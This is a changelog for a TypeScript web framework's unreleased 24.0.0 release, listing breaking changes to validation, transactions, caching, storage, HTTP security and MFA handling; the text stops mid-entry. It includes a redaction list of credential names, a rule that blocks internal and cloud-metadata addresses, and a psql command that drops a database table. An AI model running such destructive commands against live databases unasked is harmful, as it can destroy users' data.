# Changelog

All notable changes to Ultimate. Format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/); versions follow [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

Framework packages version in **lockstep** — a release bumps every package to the same version, in one commit, under one tag. Pin `@ultimat3/*` exactly; a mixed-version install is a combination nobody tested. See [PUBLISHING.md](PUBLISHING.md).

Semver applies from 1.0.0. A breaking change to a documented API needs a major — [Upgrading](https://github.com/developerz-ai/ultimate/wiki/Upgrading) says what "documented API" covers.

## [Unreleased]

**24.0.0 in progress: deep dive — gaps, problems, bugs**
([`docs/plans/2026/10/02/101-deep-dive-gaps-bugs/`](docs/plans/2026/10/02/101-deep-dive-gaps-bugs/overview.md)).
Every breaking entry below has a manual edit in the
[Upgrading](https://github.com/developerz-ai/ultimate/wiki/Upgrading) `23.x → 24.0.0` section, in
the same order. There is no legacy path, no codemod and no compatibility shim: a break is a build
error or an `X_*` error that names the rewrite. Entries are grouped by package, lowest tier first;
a later slice appends its group below the last one. `As of 2026-10` slices 01–06 have landed: `schema` and
`core` with the gate's step deadline in `cli`; tier 1 — `i18n`, `time`, `db`, `flags`; then the
rest of tier 1 — `money`, `cache`, `seo`, `storage` — with what they changed in `http`, `render`
and `cli`; then slice 04, complete — tier 2's `entity`, `policy` and `http`. A browser-launcher
repair in `testing` rode along with it. Slice 05 is `auth`: **a deployment with MFA-enrolled
users has an operator step — the first `auth` entry under Changed.** Slice 06 is complete:
`query` with `entity`'s comparison rule, `mcp` and `admin`, then `action` with what it changed in
`http`, `db` and `cli`.

### Added

Tier 0 — schema, core.

- **schema:** `X_SCHEMA_DEFAULT_INVALID` (`DefaultInvalidError`) — see Changed.
- **schema:** `SchemaError#retry` is `'terminal'` on every instance and in `toJSON()`
  (`SchemaErrorJSON.retry`), as on `UltimateErrorJSON`. `SchemaError#format({ docs: true })` appends
  the `docs:` line (`SchemaFormatOptions`).
- **core:** `hasPublicCause(code)` — whether a 5xx document may carry the error's authored `cause`.
  One definition: `@ultimat3/http`'s problem document reads it from core. `registerPublicCause` and
  `resetPublicCauses` are its write half and test seam; an app still declares a public cause
  through `registerProblemMeta({ CODE: { publicCause: true } })`.

Tier 1 — time, db.

- **time:** `isoInZone(at, zone)` — ISO-8601 with the zone's own offset
  (`2026-03-08T03:00:00-04:00`), seconds precision. `x tasks` renders `next`, `last` and `upcoming`
  through it; the CLI's private copy is deleted.
- **db:** `X_DB_TRANSACTION_ABORTED`, `X_DB_COMMIT_UNKNOWN` and `X_DB_SIBLING_SCOPE_TIMEOUT`, all
  HTTP 500, with their constructors `transactionAborted`, `commitUnknown` and
  `siblingScopeTimeout`; `TransactionOptions.siblingWaitMs` and `SIBLING_SCOPE_WAIT_MS` — see
  Changed.
- **db:** `x db gen` writes a changed `primaryKey`: drop `<table>_pkey`, add the new key, around the
  table's column statements, reversed in `down`. It wrote nothing for a key change before. A
  declared-nullable column leaving the key gets `drop not null`, in `up` and `down`. When a key
  column is dropped, `down` carries the old key as a `-- backfill …, then:` comment, not a
  statement. Two refusals, both `X_MIGRATION_IRREVERSIBLE`: a key that a recorded foreign key
  references, naming the constraints; and a new key over a column the same migration adds with no
  default, or a `null` one — add and backfill the column first, the key in the next migration. A
  `<table>_pkey` name over 63 bytes — a table name over 58 — is `X_INVARIANT`.

Tier 1 — money, cache, seo, storage.

- **money:** `MAX_FRACTION_DIGITS` (100) and `MAX_ALLOCATION_PARTS` (1,000,000).
- **cache:** `surrogateKeys(tags)` — the keys a response carries at the edge; `cacheHeaders()`
  writes the same list.
- **cache:** a fleet fence for a shared tier. `CacheTier` gains an optional `fence?(scope)`
  (`TierFence`, `FenceVerdict`); `createRedisTier` implements it with leased generation keys, so a
  bust another replica ran stops a fill this process is mid-way through. In-process tiers omit it.
  Cost on a ladder with the Redis tier: one round trip before each `load()` and one after the
  `SET`; a bust writes two generation keys per busted tag. A fill whose `load()` outlives 60 s is
  not written to Redis.
- **seo:** `DEFAULT_FORMATS` and `MAX_IMAGE_WIDTH` (8192).
- **seo:** feeds. Atom carries the channel's `<author>`, `<rights>` and `<icon>`, and an entry
  author's `<email>` / `<uri>`. RSS carries an item author — `<author>` with an e-mail,
  `dc:creator` without. An item `image` is an Atom enclosure link and an RSS `<media:content>`.
  The `dc` and `media` namespaces are declared only when used.
- **storage:** `X_STORAGE_KEY_CONFLICT` (HTTP 409), `X_STORAGE_PUT_FAILED` and
  `X_STORAGE_READ_FAILED` (both 500), with `keyConflict(disk, key, blocking)`, `putFailed`, `readFailed` and
  `getTooLarge`; `assertPutOptions` and `assertListOptions` for a driver written outside the
  package; `signedUrlBasePath`; `maxGetBytes` on all three drivers — see Changed and Fixed.

Tier 2 — entity, policy.

- **entity:** `preload(relation, { max })`, `PreloadOptions` and `MAX_PRELOADED_ROWS` (10,000) —
  see Changed.
- **policy:** `PolicyDenialError`, `denialError(label, reason, code)`,
  `POLICY_BORROWED_ERROR_CODES` and the `DenialStatus` type — see Changed.

Tier 2 — http. Tier 5 — testing.

- **http:** config keys `trustClientCertHeader` and `healthDetailPeers` — see Changed.
- **testing:** `CdpLaunchAttempt`, `LAUNCH_TIMEOUT_MS` (60 s) and `LAUNCH_ATTEMPTS` (2);
  `launchTimeoutMs` on `launchChrome` — see Changed and Fixed.

Tier 2 — auth. Tier 5 — cli (slice 05).

- **auth:** `completeMfa(auth, challenge, code, options?)` — the second factor, six digits or a
  recovery code, metered by the same reservation as the password. `mfaChallengeRequired`,
  `MFA_CHALLENGE_PURPOSE`, `MFA_CHALLENGE_TTL_MS` (5 minutes), `CompleteMfaOptions`. `Auth` gains
  `totpReplay`.
- **auth:** `saveTotpSecret`, `openTotpSecret`, `sealMfaSecrets`, `countUnsealedMfaSecrets`,
  `MFA_SECRET_PURPOSE`, `recoveryCodeHash`, and `X_MFA_SECRET_UNSEALED` (HTTP 500) — see Changed.
- **auth:** `directGrants`, `apiKeyScopes`, `isWildcardScope`, and the types `VerifiedApiKey`,
  `ApiKeyVerifyStore`, `ApiKeyActorOptions`, `AuthReservation`, `StoredMfaSecret`.
- **cli:** `x auth seal-mfa [--json]`. `x doctor` gains two auth probes: plaintext second-factor
  secrets (`X_MFA_SECRET_UNSEALED`, with the count) and a framework table no release reads
  (`X_FRAMEWORK_TABLE_ORPHANED`, new).

Tier 5 — testing (slice 05).

- **testing:** the types `CdpTimeoutObservation`, `CdpTimeoutReading` and `CdpTargetGone` — see
  Changed.

Tier 2 — entity. Tier 3 — query (slice 06).

- **entity:** `compareByKind` and `sameValueOfKind` — how Postgres compares two values of one
  column, by the column's declared kind.
- **query:** `kindsOf(entity)` and the `KindOf` type — see Changed. `readAnswer` and the
  `QueryToolAnswer` type — the one "first row or `X_NOT_FOUND`" rule the route, the tool and the
  served MCP tool share.

Tier 1 — db. Tier 2 — http. Tier 3 — action (slice 06).

- **db:** `liveTxConnection`.
- **http:** `ERROR_STATUS_SLICES` in `error-map.ts` — the status table per tier. `ERROR_STATUS` is
  unchanged for importers; the table is split into `error-map-http.ts` and
  `error-map-tier-{0..4}.ts`.
- **action:** `requestDeadlineMs`, `MutatorNotIdempotentError` (`X_MUTATOR_NOT_IDEMPOTENT`, HTTP
  500) and `IdempotencyReservationLostError` (`X_IDEMPOTENCY_RESERVATION_LOST`, HTTP 409) — see
  Changed.

Repository scripts (slice 06).

- **scripts:** `new-error-code` writes the code's status into its tier's slice and refuses a code
  another slice names.

Tier 5 — cli.

- **cli:** `Finding` carries an optional `meta` — the structured facts behind `cause`, for a
  `--json` reader.

Repository scripts.

- **scripts:** `bun run new-error-code <CODE> --package schema` registers a code in
  `@ultimat3/schema`'s frozen declarations (`SCHEMA_ERROR_CODES`). It refused that package before.

### Changed

Tier 0 — schema.

- **BREAKING — `t.date` refuses a day its month does not have.** `'2026-02-30'`, `'2026-04-31'`, a
  month `00` or `13`, a day `00` or `32`. It validated and stored the rolled-over instant —
  `2026-02-30` became March 2nd. The rule is `isIsoDateTime`, so `fromIso`, an entity
  `timestamp()` column, `@ultimat3/seo` feed dates and `@ultimat3/ui`'s `DateTime` refuse the same
  strings. Correct the date where it is written.
- **BREAKING — `t.url` refuses a string the URL parser would have cut.** A leading or trailing
  space or C0 control, and a tab, CR or LF anywhere. `' https://a.b'` validated and was stored
  untrimmed. Call `.trim()` before validating; an interior tab, CR or LF is not whitespace
  `.trim()` removes — strip or percent-encode it at the source. A space inside the path and an
  upper-case host are unchanged.
- **BREAKING — `t.object`, `t.record` and `t.money` take plain objects only.** A value whose
  prototype is neither `Object.prototype` nor `null` — a `Map`, a `Date`, a class instance — is
  `expected an object`. `t.record(t.number)` parsed a `Map` to `{}`. HTTP coercion no longer
  spreads an array or a `Date` into an object either. Pass a plain object: `{ ...instance }` or
  `Object.fromEntries(map)`.
- **BREAKING — `.default(v)` throws `X_SCHEMA_DEFAULT_INVALID` when the schema refuses `v`.** At
  declaration, so at the first import of the file. `t.number.min(5).default(1)` parsed an omitted
  field to 1 and published `minimum: 5, default: 1`. Edit the default or the rule the cause quotes.
- **BREAKING — HTTP coercion reads decimal numerals only.** `?page=0x10`, `0b11` and `0o17` stay
  strings and fail validation as `expected a number`; they arrived as 16, 3 and 15. Send decimal.

Tier 0 — core.

- **BREAKING — `defineConfig` refuses more of an invalid `app.config.ts`**, each as
  `X_CONFIG_INVALID` naming the key: an unknown `roles` entry, `jobs.backoff`, `database.driver` or
  `theme.defaultMode`; a non-boolean `database.ssl`, `realtime.enabled` or `ai.mcp.expose` (the
  string `'false'` read as on); an `auth.signInPath` or `ai.mcp.path` with no leading `/`; an empty
  `cache.tiers`; an empty or non-string `jobs.queues` entry; one locale spelled twice
  (`['EN', 'en']`). A section written as `null` or as the wrong shape, a list written as a string,
  and a non-string `seo.robots.disallow` / `seo.sitemap.extra` entry are `X_CONFIG_INVALID` too;
  those were a native `TypeError` out of the validator.
- **BREAKING — an unknown `LOG_LEVEL` fails at import** (`X_INVARIANT`). `LOG_LEVEL=verbose` and
  the upper-case `LOG_LEVEL=DEBUG` meant `info` in silence. Set one of `trace`, `debug`,
  `info`, `warn`, `error`, `fatal`, `silent`, lower-case, or unset it. Unset and empty are still `info`.
- **BREAKING — `retry()` and `retryDecision()` refuse a policy that cannot stop the loop**
  (`X_INVARIANT`), before the first try: `attempts` that is `NaN`, infinite, negative or a
  fraction, and a `timeBudgetMs` that is `NaN` or infinite. `attempts: 0` still runs once; a
  negative or fractional budget is still legal.
- **BREAKING — `createFlightGate` refuses a limit that is not a count** (`X_INVARIANT`), at
  construction: `maxConcurrent` or `maxQueued` that is `NaN`, infinite, negative or a fraction.
  `maxConcurrent: 0` now refuses every caller (`X_FLIGHT_GATE_OVERLOADED`, or the gate's own
  `overflow` error); it queued them for a slot that never came.
- **BREAKING — `withChildContext({ signal })` aborts when the parent aborts.** The patched signal
  is composed with the parent's, not swapped for it, so a client disconnect or a request timeout
  reaches the child. Work that must outlive the request does not belong in a child context:
  enqueue a job.
- **BREAKING — compound credential names are redacted.** `currentPassword`, `mfaSecret`,
  `resetToken`, `recoveryCode`, `webhookSecret`, `passwordHash`, `tokenHash`, `keyHash` and the
  rest `isRedactedKey` now matches are `[redacted]` in a log line, an audit row and the error
  monitor's envelope; they were written in clear. A name ending in `token` is redacted unless its
  qualifier says it is no bearer (`idempotency`, `page`, `continuation`, `cursor`, `sync`) — so
  `NPM_TOKEN`, `AWS_SESSION_TOKEN` and `confirmationToken` are; key material is matched by
  qualifier (`privateKey`, `signingKey`, `AWS_ACCESS_KEY_ID`); and so is a value that embeds a
  credential (`connectionString`, `dsn`, `databaseUrl`, `REDIS_URL`). `idempotencyToken`,
  `continuationToken`, `maxTokens`, `cacheKey`, `signingKeyId`, `code` and `clientSecretEnv` stay
  readable. A test or a log query that read one of
  the values reads the marker.
- **BREAKING — the Sentry envelope carries an error's `meta` under `extra.meta`.** It was spread
  into `extra`, so `meta: { fix, stack }` replaced the framework's own. Both `meta` and
  `scope.extra` are redacted, and `scope.extra` can no longer overwrite `fix`, `docs`, `stack`,
  `requestId` or `actorId`. A monitor rule or saved search on `extra.<key>` reads
  `extra.meta.<key>`. A `bigint` or a cycle in `meta` no longer drops the report.
- **BREAKING — `OTEL_EXPORTER_OTLP_TRACES_HEADERS` and `OTEL_EXPORTER_OTLP_METRICS_HEADERS` are
  read**, and each replaces `OTEL_EXPORTER_OTLP_HEADERS` for its signal. Only the generic variable
  was read. A deploy that sets both sends the per-signal one alone on that signal: put every header
  that signal needs in it, or unset it.
- **BREAKING — `OTEL_TRACES_SAMPLER=parentbased_always_on` ignores `OTEL_TRACES_SAMPLER_ARG`.** A
  leftover `ARG=0.1` thinned its roots to 10%; every root is sampled now. For a ratio, set
  `OTEL_TRACES_SAMPLER=parentbased_traceidratio`.
- **BREAKING — a wildcard host rule no longer admits an address inside the network.**
  `hostDecision` under `'*'` or `'*.suffix'` refuses a loopback, private, link-local or metadata
  address literal (`127.0.0.1`, `10.0.0.1`, `169.254.169.254`, `[::1]`). Opt in with an exact rule:
  `allowHosts: ['*', '127.0.0.1']`. A hostname that resolves inward is still admitted — this
  function has no resolver; pinning the resolved address is the connecting driver's job.
- **BREAKING — an empty `ULTIMATE_CURSOR_SECRET=` counts as unset.** It keyed the cursor HMAC with
  the empty string and passed the boot check. Now it is the development key locally and
  `X_CURSOR_SECRET_DEV` anywhere else: `x secrets set ULTIMATE_CURSOR_SECRET`. Cursors signed
  under the empty key stop verifying.

Tier 1 — i18n.

- **BREAKING — `t(key)` always interpolates.** With no vars, a placeholder renders the
  missing-value marker (`Hello ⟦name⟧`, was the raw `Hello {name}`) and `{{` / `}}` unescape to
  `{` / `}`. `t('a')` and `t('a', {})` are one render. To read a template, placeholders intact:
  `t.raw(key)`.

Tier 1 — time.

- **BREAKING — an interval cron runs through both passes of a fall-back hour.** A schedule whose
  minute or hour field is `*` or `*/n` fires in the repeated hour's second pass too; it went dark
  for that hour. A fixed time (`30 2 * * *`) still fires once, on the first pass. `CronExpression`
  gains a required `wildcardTime: boolean`: a hand-built literal adds it, `parseCron` sets it.
- **BREAKING — cron fields are read exactly.** A name is its three letters or its whole word:
  `mon`, `monday`, `mar`, `march`. `mond`, `monkey` and `marzipan` matched on their first three
  letters; they are `X_CRON_INVALID`. So are `1-5-7`, `1/2/3` and `*/2/3`, which were read as
  `1-5`, `1/2` and `*/2`.
- **BREAKING — `formatRelative` requires `zone`.** `FormatRelativeOptions` extends `FormatContext`
  whole; omitting `zone` is a type error. From a day apart the number is calendar days in that
  zone, not elapsed milliseconds truncated: 47 hours ahead across two midnights is "in 2 days".
- **BREAKING — `@ultimat3/time` refuses a number or a date it cannot represent.**
  `addDaysInZone` with a non-integer `days` is `X_SCHEDULE_INVALID` (`0.5` moved nothing, `NaN`
  was a bare `RangeError`). `formatDuration` / `formatDurationIso` with `NaN` or `±Infinity` are
  `X_INVARIANT` (rendered `NaN days` and `P0D`). `plainDateUtc`, `addPlainDays` and `plainDateIn`
  outside years 0000–9999 are `X_SCHEDULE_INVALID` (branded a five-digit year `PlainDate`).

Tier 1 — db.

- **BREAKING — `withTransaction` rejects when a statement failed and the body caught the error.**
  `X_DB_TRANSACTION_ABORTED`. Postgres had already rolled the unit of work back, so the call used
  to resolve, fire `onCommit`, and store nothing. Wrap the fallible statement in a nested
  `withTransaction` and catch that — `await withTransaction(() => fallible()).catch(fallback)` — or
  rethrow. A nested scope whose body swallowed a failure rejects the same way and loses only its
  own work; a nested scope opened on an aborted transaction is refused by name. Any `COMMIT` the
  server answers with `ROLLBACK` is this code, on both drivers.
- **BREAKING — a `COMMIT` that rejects with no SQLSTATE is `X_DB_COMMIT_UNKNOWN`**, not
  `X_DB_UNAVAILABLE`. The transaction is durable or it is not, so neither `onCommit` nor
  `onRollback` runs; `onRollback` used to. The `fix:` is a `psql "$DATABASE_URL"` session: select a
  row the transaction wrote, and re-run only when it is absent.
- **BREAKING — a nested `withTransaction` refuses options a savepoint cannot honour**
  (`X_INVARIANT`): `isolation`, `readOnly: true`, `deferrable: true`, or a `client` other than the
  root's. They were ignored — `{ readOnly: true }` wrapped writes that committed. State them on
  the outermost call; open a second database in its own unit of work.
- **BREAKING — sibling nested `withTransaction` scopes run one after the other.** Savepoints are
  a stack, so two scopes opened under one parent — `Promise.all` included — no longer interleave;
  the second waits for the first's `RELEASE` or `ROLLBACK TO`. One that waits more than
  `siblingWaitMs` rejects with `X_DB_SIBLING_SCOPE_TIMEOUT` (HTTP 500). The field is new on
  `TransactionOptions`: default `SIBLING_SCOPE_WAIT_MS`, 30 s; `0` waits without a deadline; a
  value that is not a whole number of 0 or more is `X_INVARIANT`. This refuses a nested body that
  awaits a sibling scope — a cycle — and a sibling whose predecessor holds its turn past the wait.
  Await the scopes in sequence, or pass `{ siblingWaitMs }`.
- **BREAKING — `DriftKind` gains `'changed-primary-key'`.** A table whose live key differs from
  the declared one — columns, order, or a key on one side only — is reported; it read `ok: true`.
  The finding's `fix:` is one `psql "$DATABASE_URL" -c '…'` command — the drop/add pair, run
  against the drifted database; `x db migrate` then re-checks. An exhaustive `switch` needs the
  case. Nullability is excused for the declared key's columns only.
- **BREAKING — `introspect()` reports the type and the index keys the catalog holds.**
  `ColumnDescription.dataType` is `format_type` output: `numeric(12,2)`, `text[]`, an enum's name —
  was `numeric`, `ARRAY`, `USER-DEFINED`. `IndexDescription.columns` keeps an expression key in its
  position as `(lower(title))`; it was dropped.
- **BREAKING — `CatalogColumn.generated` is `{ expression, storage: 'stored' | 'virtual' } | null`**
  on `@ultimat3/db/schema-dump`, was `string | null`. Read `.expression`. A virtual generated
  column is dumped `virtual`; it was dumped `stored`.
- **BREAKING — `unrendered.sql` names more objects**: extended statistics, forced row security, a
  column whose storage departs from its type's, an unpopulated materialized view, and a trigger on
  a relation the dump does not create (filed under `09_triggers/` before, which refused the load).
  An app whose database holds one re-runs `x db gen` and commits `packages/db/schema/`.

Tier 1 — flags.

- **BREAKING — `expiresAt` must be ISO-8601 and name a real day.** `'December 1, 2026'`,
  `'12/01/2026'` and `'2026-02-30'` are `X_FLAG_EXPIRY_INVALID` at declaration; the first two were
  read at the host's local midnight, the third as March 2nd. Write `'2026-12-01'`, or a date-time
  with `Z` or an offset.
- **BREAKING — `configureFlags({ reportEveryMs })` refuses `NaN`, `Infinity`, a negative and a
  fraction** (`X_INVARIANT`). `NaN` removed the rate limit; `Infinity` muted the report. `0` is
  legal.

Tier 1 — cache.

- **BREAKING — a tagged response carries an entity index key at the edge.** `cacheHeaders()` and
  `surrogateKeys()` add one `e:<entity>` per distinct entity to `Surrogate-Key` and `Cache-Tag`:
  tags `post:1`, `post:2` go out as `post:1 e:post post:2`. A row bust purges `<entity>:<id>` and
  `<entity>`; a collection bust purges `e:<entity>` and `<entity>` — it used to miss every detail
  page. Growth is `len(entity) + 3` bytes per entity per header: 14 bytes a response for `post`.
  A test that asserts the header value adds the key. An edge copy cached before the upgrade lacks
  the index key until its `s-maxage` passes; a collection bust does not reach it until then.
- **BREAKING — a tag with whitespace or a comma is refused where it is emitted.** `cacheHeaders()`
  and `surrogateKeys()` throw `X_CACHE_PURGE_FAILED`; a CDN splits such a key into keys nothing
  purges. The CDN tier refuses the same bust before any purge driver is called. Rename the tag in
  its `declareTags(...)` call.

Tier 1 — seo.

- **BREAKING — `responsiveImage()` offers WebP only by default**, was AVIF then WebP. The built-in
  pipeline cannot encode AVIF, so the first `<source>` a browser picked answered
  `X_IMAGE_UNSUPPORTED`. An app whose image driver encodes AVIF passes
  `responsiveImage(input, { formats: FORMAT_ORDER })`. `usableWidths` caps at `MAX_IMAGE_WIDTH`
  (a 10,000-wide source's widest candidate is 8192, was 10000), drops a candidate that is not a
  whole number of at least 1, and refuses an intrinsic width that is not one (`X_INVARIANT`; `NaN`
  went out as `?w=NaN`).

Tier 1 — storage.

- **BREAKING — `promoteAttachment` requires `policy`.** It measures the pending object with
  `stat()` and refuses one over `policy.maxBytes` (`X_STORAGE_TOO_LARGE`); on a bucket-backed disk
  nothing had measured it. Pass the policy the upload was granted under:
  `promoteAttachment({ disk, key, orgId, target, policy })`.
- **BREAKING — `StorageDriver` gains a required `stat(key)`**: the object without its bytes, or
  `undefined`. A driver written outside the package implements it; the three shipped ones do.
- **BREAKING — `lastModified` is optional on `StorageListEntry` and `StorageObject`.** Absent when
  the provider reported none; it was epoch 0, which `sweepOrphans` read as older than every window
  and deleted. `sweepOrphans` now spares such an object. A reader handles `undefined`.
- **BREAKING — `get()` has a ceiling on every driver.** An object over `maxGetBytes` — default the
  disk's `maxPutBytes`, 10 MB unless set — is `X_STORAGE_TOO_LARGE`. Read it with
  `disk.stream(key)`, or raise the ceiling: `s3Driver({ bucket, maxGetBytes })`.
- **BREAKING — variant keys keep the source's extension.** `photos/hero.png@w640.webp`, was
  `photos/hero@w640.webp`: `hero.png` and `hero.jpg` shared one variant. Variants stored under the
  old shape are never read again and nothing sweeps them; the Upgrading entry has the listing
  commands.
- **BREAKING — `variantKey` and `fitDimensions` refuse a width or height that is not a whole number
  of at least 1** (`X_INVARIANT`); `{ width: NaN }` minted `a@wNaN.webp`. `fitDimensions` never
  upscales under `contain` — a 40×20 source asked for 400×400 is 40×20, was 400×200 — and never
  returns a zero edge.
- **BREAKING — signed URLs are `v2` and name their disk.** The canonical string includes the
  disk's base path; a URL signed for one local disk verified on another. Every local- and
  memory-disk signed URL outstanding at deploy stops verifying — the default lifetime is 15
  minutes. `canonicalRequest(constraints, basePath)` and
  `signConstraints(secret, constraints, basePath)` take the path; `signedUrlBasePath(baseUrl)`
  derives it.
- **BREAKING — ISO base media files are sniffed by major brand.** AVIF, HEIC, MOV, M4A and 3GP
  sniff as their own types; each was `video/mp4`. A policy that allowed `video/mp4` and accepted
  those under that label now rejects them: add the real types to `allowedContentTypes`.
- **storage:** `DEV_SIGNING_SECRET`, `STORAGE_SIGNING_SECRET_KEY` and `usesDevStorageSecret` live
  in `signing-secret.ts`. The barrel exports are unchanged; a deep import of `driver-local` moves.

Tier 4 — render.

- **BREAKING — a `revalidate.tags` entry that cannot be a purge key is refused at registration.**
  `X_ROUTE_MODE_INVALID`, naming the route file, for a tag with whitespace or a comma. The tag now goes out on every response of the route — see Fixed. Rename the tag.

Tier 2 — entity.

- **BREAKING — `Driver` gains a required `transactor()`, and `SealedMeta` a required `plaintext`.**
  A hand-built driver adds the method; a wrapper delegates:
  `transactor: () => inner.transactor()`. A seed dry run rolls back through it. `plaintext` is the
  parser the column had before `.sealed()`.
- **BREAKING — `dbDrift` is no longer exported from `@ultimat3/entity`.** Drift is db's:
  `import { dbDrift } from '@ultimat3/db'`. `ENTITY_ERROR_CODES` and `EntityErrorCode` no longer
  contain `X_DB_DRIFT`.
- **BREAKING — `preload(relation)` has a ceiling.** At most `max` related rows per page, default
  `MAX_PRELOADED_ROWS`, 10,000; past it `X_INVARIANT_VIOLATED`, never a truncated list. Declare the
  relation's own bound: `posts.preload('comments', { max: 50000 })`. A repeated
  `preload(name, { max })` replaces the ceiling with the later stated one, as a second `.limit()`
  does; a repeat that states no `max` leaves it. The refusal's `fix:` is
  `x entities describe <entity> --json`, with the `{ max }` edit in the cause.
- **entity:** a repository pinned with `postgresDriver({ client })` joins a transaction opened on
  that same client. `X_REPO_CLIENT_PINNED` remains for a transaction on a different client.
- **entity:** a seed `dryRun` executes every verb inside a transaction and rolls it back. Its
  metrics equal a real run's: a key another tenant holds is `skipped`, a second verb sees the
  first one's rows, and a seed that would fail fails.

Tier 2 — policy.

- **BREAKING — `assertAllowed` throws the decision's code.** `X_UNAUTHENTICATED` for no actor —
  it was `X_FORBIDDEN` for every denial — and the app's own code for `denied(reason, code)`, as a
  `PolicyDenialError`. A `catch` that matches `X_FORBIDDEN` for an anonymous caller matches
  `X_UNAUTHENTICATED`.
- **BREAKING — `HttpDenial.status` and `problem.status` are `401 | 403`** (`DenialStatus`), was the
  literal `403`: 401 when the code is `X_UNAUTHENTICATED`. `problem.title` is the code's
  registered title, was `policy denied this actor`.
- **BREAKING — a predicate or `definePolicy` `check` that returns anything but `true` or a
  well-formed decision denies.** `{ allowed: 'yes' }` read as allowed; a forgotten `return` was a
  bare `TypeError`. Return `true`, `false`, or `denied(reason, code)`.

Tier 2 — http.

- **BREAKING — `ctx.peer` needs `trustClientCertHeader: true`.** `trustProxy` alone no longer reads
  `x-forwarded-client-cert`: appending to `x-forwarded-for` is no promise that the proxy strips a
  certificate header the client sent. `configureHttp({ trustClientCertHeader: true })`, only where
  the proxy strips or overwrites that header.
- **BREAKING — an anonymous unsafe request carrying `Origin` or `sec-fetch-site` must prove
  same-origin**, else `X_CSRF_BLOCKED` (403). Anonymous writes were exempt, which left a sign-in
  form forgeable. An anonymous request with neither header — a webhook, `curl`, a server-to-server
  call, a one-click unsubscribe — is unaffected. A cross-origin browser form lists its origin:
  `configureHttp({ cors: { origins } })`. The code's title is now "an unsafe request that did not
  prove same-origin"; code and status are unchanged.
- **BREAKING — a request that fails `auth: 'required'` is metered.** Each failure spends
  `rateLimit.defaultBucket` under one key per client address, `unauthenticated|ip:<address>`,
  across all routes. Past it the answer is 429 with `Retry-After`, not 401 or the sign-in
  redirect. A request that authenticates spends nothing there. The bearer mount is metered the same
  way: the fourth wrong token from one address is 429, and a real token is still served.
- **BREAKING — `/healthz` and `/readyz` on the web role tell a stranger only the verdict.** A peer
  not in `healthDetailPeers` gets `{ state, ready, role }`; the build id, the in-flight count and
  the readiness check names go to a listed peer. Default `['loopback']`; an entry is an address
  class (`loopback`, `private`, `link-local`, `ula`, `cgnat`, …) or one exact IP literal — no
  CIDR, no hostname (`X_CONFIG_INVALID`). Status codes are unchanged. For an in-cluster reader:
  `configureHttp({ healthDetailPeers: ['loopback', 'private'] })`. **The sync role's health routes
  are not covered yet**; that lands with the realtime slice.
- **BREAKING — a handler `cache-control` that states freshness is a shared-cache offer.**
  `max-age`, `must-revalidate` or `proxy-revalidate` with no `private` or `no-store` is now
  handled as `public` / `s-maxage` already were: `private, max-age=0` for an identified request;
  `vary: accept-language, cookie, x-timezone` added for an anonymous GET; `no-store` on a POST or
  a 4xx/5xx. To keep a browser-only lifetime, write `private, max-age=N`.
- **BREAKING — a non-empty body with no `content-type` is refused.** `X_BODY_INVALID` (422) from
  `request.body()` and the `body` stage; it read as `undefined`, so an all-optional schema
  validated a request nobody parsed. Send the header. `bodyBytes()` still reads raw bytes.
- **BREAKING — `defineHttpConfig` no longer defaults `hostname` from `HOSTNAME`.** Docker sets
  that variable to the container id. The boot passes `HOST`; an embedder passes `hostname`.
  `buildId: null` now wins over `BUILD_ID`, switching skew detection off as written.

Tier 5 — testing.

- **BREAKING — `E2eBrowser.close()` and `LaunchedBrowser.close()` return a promise.** Await them;
  `closed` is removed. Unawaited, a process that exits next leaves a Chrome child and a profile
  directory behind. `CdpLaunchFailedError`'s input is `{ executable, attempts }`, was
  `{ executable, detail }`.

Tier 2 — auth.

- **BREAKING — OPERATOR ACTION: `x_users.mfa_secret` is sealed, and a plaintext value is never
  read.** Every deployment with MFA-enrolled users does three things, in this order:
  1. Make the master key exist: `x secrets init`, or `ULTIMATE_SECRETS_KEY` in the deploy.
  2. Deploy this release.
  3. Run `x auth seal-mfa --json` once. It reports `{ sealed, alreadySealed, skipped }`, is
     idempotent, and leaves alone a row that changed underneath it.

  Until step 3 an enrolled user gets `X_MFA_SECRET_UNSEALED` (500) at the second factor, and
  `x doctor` reports how many rows are left. Without the master key, a deployment with MFA users
  gets `X_SEAL_KEY_MISSING` at `login()`. An app's enrolment writes through
  `saveTotpSecret(auth, userId, secret)`; a custom adapter seals with the exported
  `sealMfaSecrets({ adapter })`. The column type is unchanged — there is no migration.
- **BREAKING — `x_auth_failures` is no longer created or read.** `x_auth_lockouts` gains
  `attempts_ms bigint[]` and `admitted boolean`, added at boot by `add column if not exists`:
  nothing to run, and a replica on the previous release keeps working through a rolling deploy.
  Failure counts in the old table are not carried; live lockouts are. Once every replica runs this
  release `x doctor` raises `X_FRAMEWORK_TABLE_ORPHANED` with the command:
  `psql "$DATABASE_URL" -c 'drop table if exists x_auth_failures'`.
- **BREAKING — `AuthLimiter` is a reservation.** `assertAllowed` and `recordFailure` are gone;
  `reserve(key): Promise<AuthReservation>` counts the attempt before the password hash, and
  `refund(reservation)` returns it on success. One statement on Postgres. Every custom limiter
  implements the two.
- **BREAKING — `verifyApiKey` returns `{ record, owner }` and refuses a key whose owner is missing
  or disabled.** It takes an `ApiKeyVerifyStore` (an `ApiKeyStore` with `findUserById`);
  `apiKeyActor` takes its result. On the bearer mount and on MCP such a key's next request is 401.
  A key whose `userId` is not an `x_users` id must be issued without `userId`.
- **BREAKING — an owned API key keeps only the scopes its owner's grants cover.** `*` and
  `<res>:*` are refused at `issueApiKey` (`X_CONFIG_INVALID`) and dropped from stored rows. A key
  owned by a user who holds roles and no direct grants resolves with no scopes until the app
  passes `apiKeyResolver(store, { grantsOf })`. `actorFromApiKey(key, ownerGrants)`; the `agent`
  arm of `AuthIdentity` gains `ownerGrants`.
- **BREAKING — `X_MFA_REQUIRED` carries `meta.challenge`, not `meta.userId`.** `login()` and the
  OAuth path both end in it; the challenge is a short-lived sealed value handed to `completeMfa`.
- **BREAKING — `redeemRecoveryCode`, `mfaRequired` and `authNotImplemented` are removed.**
  Redemption goes through `completeMfa`; a custom adapter implements
  `consumeRecoveryCode(userId, codeHash)` with `recoveryCodeHash(code)`.
- **BREAKING — `AuthAdapter` has eight more required members.** `findUserByExternalId`,
  `listUsersByOrg`, `deleteSessionsForUser`, `deleteSessionsCreatedBefore` and
  `deleteSessionsForOrg` were optional with a runtime `X_NOT_IMPLEMENTED`;
  `listUsersWithMfaSecret`, `replaceMfaSecret(userId, expected, next)` and
